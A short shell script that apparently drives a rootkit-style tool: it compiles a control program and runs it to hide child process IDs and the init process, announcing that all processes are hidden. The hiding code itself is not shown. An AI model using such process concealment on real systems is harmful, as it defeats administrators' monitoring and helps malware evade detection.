#make sure control program is running
gcc -o control control_program.c
echo "enable child hiding"
./control -hide_child_pid
echo "Hide init process"
./control -hide_ps 1
echo "Done, all processes are hidden now"